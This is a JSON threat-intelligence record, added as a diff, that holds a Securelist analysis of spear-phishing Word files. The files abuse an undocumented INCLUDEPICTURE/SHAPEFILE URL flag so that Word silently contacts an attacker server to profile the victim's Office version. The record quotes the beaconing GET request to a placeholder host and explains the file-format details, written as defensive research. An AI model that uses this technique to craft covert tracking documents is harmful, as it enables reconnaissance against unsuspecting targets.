@@ -1,0 +1,86 @@
+{
+    "id": "a0c5474d-63f8-4e9a-a0e6-2f054cdae005",
+    "created_at": "2023-01-12T15:03:59.279856Z",
+    "updated_at": "2025-03-27T02:06:13.851805Z",
+    "deleted_at": null,
+    "sha1_hash": "dcb56a88719bb930b7082ff497d6ef2384388d89",
+    "title": "2017-09-18 - An (un)documented Word feature abused by attackers",
+    "authors": "",
+    "file_creation_date": "2022-09-01T10:19:47Z",
+    "file_modification_date": "2022-09-01T10:19:47Z",
+    "file_size": 300240,
+    "plain_text": "# An (un)documented Word feature abused by attackers\n\n**[securelist.com/an-undocumented-word-feature-abused-by-attackers/81899](https://securelist.com/an-undocumented-word-feature-abused-by-attackers/81899)**\n\nAuthors\n\n[Alexander Liskin](https://securelist.com/author/alexanderliskin/)\n\nAnton Ivanov\n\n[Andrey Kryukov](https://securelist.com/author/andreykrukov/)\n\n\n-----\n\nA little while back we were investigating the malicious activities of the Freakyshelly targeted\nattack and came across spear phishing emails that had some interesting documents\nattached to them. They were in OLE2 format and contained no macros, exploits or any other\nactive content. However, a close inspection revealed that they contained several links to\nPHP scripts located on third-party web resources. When we attempted to open these files in\nMicrosoft Word, we found that the application addressed one of the links. As a result, the\nattackers received information about the software installed on the computer.\n\nWhat did the bad guys want with that information? Well, to ensure a targeted attack is\nsuccessful, intelligence first needs to be gathered, i.e. the bad guys need to find ways to\nreach prospective victims and collect information about them. In particular, they need to\nknow the operating system version and the version of some applications on the victim\ncomputer, so they can send it the appropriate exploit.\n\nIn this specific case, the document looked like this:\n\nThere’s nothing suspicious about it at first glance – just a few tips about how to use Google\nsearch more effectively. The document contains no active content, no VBA macros,\nembedded Flash objects or PE files. However, when the user opens the document, Word\nsends the following GET request to one of the internal links. So we opened the original\ndocument used in the attack, replaced the suspicious links with http://evil-*, and obtained the\nfollowing:\n\n_GET http://evil-333.com/cccccccccccc/ccccccccc/ccccccccc.php?cccccccccc HTTP/1.1_\n_Accept: */*_\n\n_User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET_\n_CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0;_\n\n\n-----\n\n_.NET4.0C; InfoPath.2; MSOffice 12)_\n_Accept-Encoding: gzip, deflate_\n\nHost: evil-333.com\n\nProxy-Connection: Keep-Alive\n\nThis code effectively sent information about the software installed on the victim machine to\nthe attackers, including info about which version of Microsoft Office was installed. We\ndecided to examine why Office followed that link, and how these links can be identified in\ndocuments.\n\n## Inside a Word document\n\nThe first thing about the document that caught our eye was the INCLUDEPICTURE field\ncontaining one of the suspicious links. However, as can be seen, that is not the link that\nWord addresses.\n\nAs a matter of fact, the data chunk seen in the fragment above contains the first and only\npiece of text in this document. The text in Word documents resides in the WordDocument\nstream in a ‘raw state’, i.e. it contains no formatting except so-called fields. The fields tell\nWord that a certain segment of the text must be presented in a specific way; for example, it is\nthanks to these fields that we can see active links to other pages of the document, URL links,\netc. The field INCLUDEPICTURE indicates that an image is attached to certain characters in\nthe text. The 0x13 byte (marked in red) in front of this field indicates that the ‘raw’ text ends\nthere and a field description begins. The description format is roughly as follows (according\nto [[MS-DOC]: Word (.doc) Binary File Format):](https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-doc/ccd7b486-7881-484c-a137-51170af7cc22)\n\n_Begin = 0x13_\n\n_Sep = 0x14_\n\n_End = 0x15_\n\n_Field = <Begin> *<Field> [Sep] *<Field> <End>_\n\n\n-----\n\nThe separator byte 0x14 is marked in yellow, and the field end byte 0x15 is shown inside the\npink box.\n\nThe link to the image in the INCLUDEPICTURE field should be in ASCII format, but in this\ncase it is in Unicode, so Word ignores the link. However, the separator byte 0x14 is followed\nby the byte 0x01 (shown in the green box) which indicates to the word processor that an\nimage should be inserted at this point. The question is: how do we find this image?\n\nThe characters and groups of characters within the text also possess properties; just like\nfields, these properties are responsible for formatting (for example, they specify that a certain\npiece of text must be rendered in italics). The properties of characters are stored in a twolevel table within document streams under the names ‘xTable’ and ‘Data’. We will not go into\nthe complex details of how to analyze character properties, but as a result of this analysis we\ncan find the character properties from the offset 0x929 to 0x92C in the WordDocument\nstream:\n\nThis is the byte sequence with the picture placeholder 0x14 0x01 0x15. In the actual\ndocument, these bytes are located at offsets 0xB29 – 0xB2C, but the WordDocument stream\nbegins with offset 0x200, and the character offsets are specified relative to its beginning.\n\nThe properties of the group of characters CP[2] indicate that an image is attached to them\nthat is located in the Data stream at offset 0:\n\n_1FEF: prop[0]: 6A03 CPicLocation_\n\n_1FF1: value[0]: 00000000 ; character = 14_\n\nWe arrive at this conclusion based on the fact that byte 0x01 is indicated in the\nINCLUDEPICTURE field’s value – this means the image should be located in the Data\nstream at the appropriate offset. If this value were different, then it would have been\nnecessary to look for the image in a different place or ignore this property.\n\nThis is where we stumbled on an undocumented feature. Microsoft Office documentation\nprovides basically no description of the INCLUDEPICTURE field. This is all there is:\n\n_0x43 INCLUDEPICTURE Specified in [ECMA-376] part 4, section 2.16.5.33._\n\nStandard ECMA-376 describes only that part of INCLUDEPICTURE that precedes the\nseparator byte. It has no description of what the data that follows it may mean, and how it\nshould be interpreted. This was the main problem in understanding what was actually\nhappening.\n\n\n-----\n\nSo, we go to offset 0 in the Data stream and see that the so-called SHAPEFILE form is\nlocated there:\n\nForms are described in a different Microsoft document: [MS-ODRAW]: Office Drawing Binary\nFile Format. This form has a name and, in this case, it is another suspicious link:\n\nHowever, this is just an object name, so this link is not used in any way. While investigating\nthis form further, let’s look at the flags field (in the red box):\n\nThe value 0x0000000E resolves into a combination of three flags:\n\nmsoblipflagURL 0x00000002\nmsoblipflagDoNotSave 0x00000004\nmsoblipflagLinkToFile 0x00000008\n\nThis indicates that additional data should be attached to the form (it is highlighted in yellow in\nthe screenshot), and that this data constitutes a URL that leads to the actual content of the\nform. Also, there is a ‘do not save’ flag, which prevents this content from being saved to the\nactual document when it is opened.\n\nIf we look at what this URL is, we see that it’s the actual link that Word follows when the\ndocument is opened:\n\nWe should note that besides Word for Windows, this ‘feature’ is also present in Microsoft\nOffice for iOS and in Microsoft Office for Android; LibreOffice and OpenOffice do not have it.\nIf this document is opened in LibreOffice or OpenOffice, the malicious link is not called.\n\n\n-----\n\nThis is a complex mechanism that the bad guys have created to carry out profiling of\npotential victims for targeted attacks. In other words, they perform serious in-depth\ninvestigations in order to stay undetected while they carry out targeted attacks.\n\nKaspersky Lab’s security products are able to detect when the technique described in this\narticle is used in Microsoft Word documents, and to find links embedded in a document using\nthe same technique.\n\nWatch Video At:\n\nhttps://youtu.be/_GsABMeZrdY\n\n[Malware Descriptions](https://securelist.com/tag/malware-descriptions/)\n[Microsoft Word](https://securelist.com/tag/microsoft-word/)\n[Targeted attacks](https://securelist.com/tag/targeted-attacks/)\n[Vulnerabilities and exploits](https://securelist.com/tag/vulnerabilities-and-exploits/)\n\nAuthors\n\n[Alexander Liskin](https://securelist.com/author/alexanderliskin/)\n\nAnton Ivanov\n\n\n-----\n\n[Andrey Kryukov](https://securelist.com/author/andreykrukov/)\n\nAn (un)documented Word feature abused by attackers\n\nYour email address will not be published. Required fields are marked *\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-09-18 - An (un)documented Word feature abused by attackers.pdf"
+    ],
+    "report_names": [
+        "2017-09-18 - An (un)documented Word feature abused by attackers.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "e819f7c1-855b-4834-b30c-493832336ddb",
+            "created_at": "2022-10-25T16:07:23.939418Z",
+            "updated_at": "2025-03-27T02:02:10.038419Z",
+            "deleted_at": null,
+            "main_name": "Operation Comando",
+            "aliases": [],
+            "source_name": "ETDA:Operation Comando",
+            "tools": [
+                "AsyncRAT",
+                "Atros2.CKPN",
+                "Bladabindi",
+                "CapturaTela",
+                "Jorik",
+                "LimeRAT",
+                "Nancrat",
+                "NanoCore",
+                "NanoCore RAT",
+                "Remcos",
+                "RemcosRAT",
+                "Remvio",
+                "Revenge RAT",
+                "RevengeRAT",
+                "Revetrat",
+                "Socmer",
+                "Zurten",
+                "njRAT"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "e1e83b71-854a-4ddf-82ed-141c1d151c3c",
+            "created_at": "2023-01-06T13:46:38.934536Z",
+            "updated_at": "2025-03-27T02:00:02.955821Z",
+            "deleted_at": null,
+            "main_name": "Operation Comando",
+            "aliases": [],
+            "source_name": "MISPGALAXY:Operation Comando",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535839,
+    "ts_updated_at": 1743041173,
+    "ts_creation_date": 1662027587,
+    "ts_modification_date": 1662027587,
+    "files": {
+        "pdf": "https://archive.orkl.eu/dcb56a88719bb930b7082ff497d6ef2384388d89.pdf",
+        "text": "https://archive.orkl.eu/dcb56a88719bb930b7082ff497d6ef2384388d89.txt",
+        "img": "https://archive.orkl.eu/dcb56a88719bb930b7082ff497d6ef2384388d89.jpg"
+    }
+}
